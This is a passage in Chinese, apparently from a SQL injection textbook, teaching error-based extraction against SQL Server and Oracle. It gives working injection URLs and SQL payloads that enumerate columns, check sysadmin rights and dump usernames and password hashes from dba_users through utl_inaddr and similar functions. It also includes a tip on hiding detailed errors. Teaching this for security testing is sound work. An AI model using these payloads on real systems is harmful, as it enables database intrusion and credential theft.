### 4.5.5 利用基于错误的方法提取数据

如果使用前面介绍的基于错误的方法，那么需要发送以下URL：
```
http://www.victim.com/products.asp?id=10/(case+when+(len(system_user)>8)+then+1+else+0+end)
```
由于用户名多于8个字符，该URL会产生一个错误。接下来，我们继续使用二分查找方法进一步缩小范围：
```
http://www.victim.com/products.asp?id=12/(case+when+(len(system_user)>16)+then+1+else+0+end) ---> Error
http://www.victim.com/products.asp?id=12/(case+when+(len(system_user)>9)+then+1+else+0+end) ---> Error
```
因为 `(len(system_user) > 8)` 条件为真且 `(len(system_user) > 9)` 条件为假，我们可以确定用户名长度为9个字符。

既然知道了用户名的长度，下一步是提取组成用户名的具体字符。为此，我们需要循环遍历每个字符，并针对其ASCII码值执行二分查找。在SQL Server中，可以使用以下表达式提取指定字符并计算其ASCII码值：
```sql
ascii(substring((select system_user),1,1))
```
此表达式检索 `system_user` 的值，从第一个字符开始提取子串（长度为一个字符），并计算其十进制的ASCII码值。因此，下列URL将被使用：
```
http://www.victim.com/products.asp?id=12/(case+when+(ascii(substring((select system_user),1,1))>x)+then+1+else+0+end)
```
通过不断进行二分查找，直到找到正确的字符为止。例如，要查找第一个字符是否为 'a'（ASCII：97或0x61）时，可以重复上述过程。同样的方法也可以用于查找后续字符，从而提取整个用户名。

需要注意的是，虽然这种方法可以从数据库中提取任意数据，但提取大量信息时会生成大量的请求。尽管存在一些自动化工具，但我们不建议使用这种方法来提取大规模数据（如整个数据库）。

### 4.5.6 利用SQL注入错误

在非首SQL注入中，数据库错误消息对于攻击者来说非常有用，可以帮助他们构造有效的查询。我们已经看到，通过一次只能提取一位数据的条件语句，可以利用错误消息从数据库中检索信息。但在某些情况下，错误消息还可以更快地提取数据。

在本章开头部分，我们通过在需要数字值的位置注入 `@@version` 字符串，产生了一条包含 `@@version` 变量值的错误消息，从而披露了SQL Server的版本。这是因为SQL Server产生的错误消息比其他数据库更详细。同样，我们也可以使用这种方法从数据库中提取其他信息。例如，可以查询当前执行查询的数据库用户：
```
http://www.victim.com/products.asp?id=system_user
```
请求该URL时将产生如下错误：
```
Microsoft OLE DB Provider for ODBC Drivers error *80040e07*
[Microsoft] [ODBC SQL Server Driver] [SQL Server]Conversion failed when
/products,asp, line 33
```

另一种方法是利用 `is_srvrolemember` 函数返回的值来触发强制类型转换错误：
```
http://www.victim.com/products.asp?id=char(65%2Bis_srvrolemember('sysadmin'))
```
如果当前用户不属于 `sysadmin` 组，则 `is_srvrolemember` 返回0，`char(65+0)` 将返回字母A；如果用户拥有管理员权限，则 `is_srvrolemember` 返回1，`char(65+1)` 将返回字母B，从而触发强制类型转换错误。尝试该查询，我们将收到以下错误：
```
Microsoft OLE DB Provider for ODBC Drivers error *80040e07'
[Microsoft] [ODBC SQL Server Driver][SQL Server]Conversion failed when
/products,asp, line 33
```
这表明我们的数据库用户拥有管理员权限。

此外，`HAVING` 子句提供了另一种基于错误的方法，允许攻击者枚举当前查询使用的列名。通常与 `GROUP BY` 子句一起使用以过滤 `SELECT` 语句的结果。在SQL Server中，可以通过以下URL产生一条包含查询第一列的错误消息：
```
http://www.victim.com/products.asp?id=1+having+1=1
```
应用将返回以下错误：
```
[Microsoft][ODBC SQL Server Driver][SQL Server]Column 'products.id' is
invalid in the select list because it is not contained in either an
aggregate function or the GROUP BY clause.
/products,asp, line 233
```
该错误消息包含了 `products` 表和 `id` 列的名称。要移动到第二列，只需添加一条包含已发现列名的 `GROUP BY` 子句：
```
http://www.victim.com/products.asp?id=1+group+by+products.id+having+1=1
```
现在收到另一条错误消息：
```
Microsoft OLE DB Provider for ODBC Drivers error '80040e14'
invalid in the select list because it is not contained in either an
aggregate function or the GROUP BY clause.
/shop.asp, line 233
```
第一列属于 `GROUP BY` 子句，因而该错误现在由第二列 `products.name` 触发。接下来将该列添加到 `GROUP BY` 子句，不需要清除前面的内容：
```
http://www.victim.com/shop.asp?item=1+group+by+products.id,products.name+having+1=1
```
通过简单地重复该过程直到不再产生错误，便可以轻松枚举出所有列。

### 提示

详细的错误消息对攻击者非常有用。如果您负责维护某个Web应用，请确保正确配置应用，使其在出现错误时只返回一个自定义的HTML页面，显示一条通用的错误消息，而详细的错误消息仅限开发人员和Web应用管理员可见。

### 4.5.7 Oracle中的错误消息

Oracle也支持通过错误消息提取数据。根据数据库版本的不同，可以使用不同的PL/SQL函数来控制错误消息的内容。最著名的函数之一是 `utl_inaddr`，它负责解析主机名：
```sql
SQL> select utl_inaddr.get_host_name('victim') from dual;
ORA-29257: host victim unknown
ORA-06512: at "SYS.UTL_INADDR", line 4
ORA-06512: at "SYS.UTL_INADDR", line 35
ORA-06512: at line 1
```
在这个例子中，我们可以控制错误消息的内容。无论向 `utl_inaddr` 函数传递什么内容，都会显示在错误消息中。

在Oracle中，可以使用 `SELECT` 语句替换任何值（例如，一个字符串）。唯一的限制是该 `SELECT` 语句只能返回一列和一行，否则将收到 `ORA-01427` 错误消息：单行子查询返回多行。可以像以下SQL*Plus命令行那样使用该函数：
```sql
SQL> select utl_inaddr.get_host_name((select username||'=password' from dba_users where rownum=1)) from dual;
ORA-29257: host SYS=D4DF7931AB130E37 unknown
ORA-06512: at "SYS.UTL_INADDR", line 4
ORA-06512: at "SYS.UTL_INADDR", line 35
ORA-06512: at line 1
```
现在可以将 `utl_inaddr.get_host_name` 函数注入一个易受攻击的URL中。图4-9中的错误消息包含了数据库的当前日期。

通过使用如下所示的可注入字符串，我们已经拥有从每个可访问的表中检索数据所必需的工具：
```sql
or 1=utl_inaddr.get_host_name((INNER))
```
只需用返回单行单列的语句替换里面的 `SELECT` 语句即可。为了绕过单列的限制，可以将多列连接在一起。

例如，以下查询用于返回用户名及其对应的口令：
```sql
select username||'=password' from (select rownum r, username, password from dba_users) where r=1
ORA-29257: host SYS=D4DF7931AB130E37 unknown
```
为了避免连接的字符串中出现单引号，可以使用 `concat` 函数：
```sql
select concat(concat(username, chr(61)), password) from (select rownum r, username, password from dba_users) where r=2
ORA-29257: host SYSTEM=E45049312A231FD1 unknown
```
也可以绕过单行限制以获取多行信息，可以使用带XML的专用SQL语句或专用的Oracle函数 `listagg` 在单行中获取所有行。这两种方法唯一的限制是输出大小（最大为4000字节）：
```sql
select xmltransform(sys_xmlagg(sys_xmlegen(username)), xmltype('<!DOCTYPE x>')).getstringval() from all_users;
select sys.listagg(distinct username, ';') within group (order by username) from all_users
```
输出：
```
ALEX; ANONYMOUS; APEX_PUBLIC_USER; CTXSYS; DBSNMP; DEMO1; DIP; DUMMY; EXFSYS; FLOWS_030000; FLOWS_FILES; MDDATA; MDSYS; MGMT_VIEW; MONODEMO; OLAPSYS; ORACLE_OCM; ORDPLUGINS; ORDSYS; OUTLN; OWBSYS; PHP; PLSQL; SCOTT; SI_INFORMTN_SCHEMA; SPATIAL_CSW_ADMIN_USR; SPATIAL_WFS_ADMIN_USR; SYS; SYSMAN; SYSTEM; TSMSYS; WKPROXY; WKSYS; KK_TEST; WMSYS; X; XDB; XSSNULL;
```
将 `utl_inaddr` 注入上述查询之一后，将会抛出一个包含所有用户名的错误消息，如图4-10所示。

默认情况下，Oracle 11g通过新引入的ACL（Access Control List，访问控制列表）来限制对 `utl_inaddr` 和其他网络包的访问。在这种情况下，我们将得到不包含数据的 `ORA-24247` 错误消息：
```
ORA-24247: network access denied by access control list
```
当数据库被加强且 `utl_inaddr` 取消了 `PUBLIC` 授权时，必须使用其他函数。以下Oracle函数（拥有 `PUBLIC` 授权）会返回可控制的错误消息：

注入以下内容：
```sql
or 1=ORDSYS.ORD_DICOM.GETMAPPINGXPATH(user, 'a', 'b')
```
返回以下内容：
```
ORA-53044: invalid tag: VICTIMUSER
```

注入以下内容：
```sql
or 1=SYS.DBMS_AW_XML.READAWMETADATA(user, 'a') - *
```
返回以下内容：
```
ORA-29532: Java call terminated by uncaught Java exception: oracle.AWXML.AWException: oracle.AWXML.AWException: An error has occurred on the server
Error class: Express Failure
Server error descriptions:
ENG: ORA-34344: Analytic workspace VICTIMUSER is not attached.
```

注入以下内容：
```sql
or 1=CTXSYS.CTX_QUERY.CHK_XPATH(user, 'a', 'b') - *
```
返回以下内容：
```
ORA-20000: Oracle Text error:
DRG-11701: thesaurus VICTIMUSER does not exist
ORA-06512: at "CTXSYS.DRUE", line 160
```

这些方法展示了如何通过控制错误消息来提取数据库中的信息。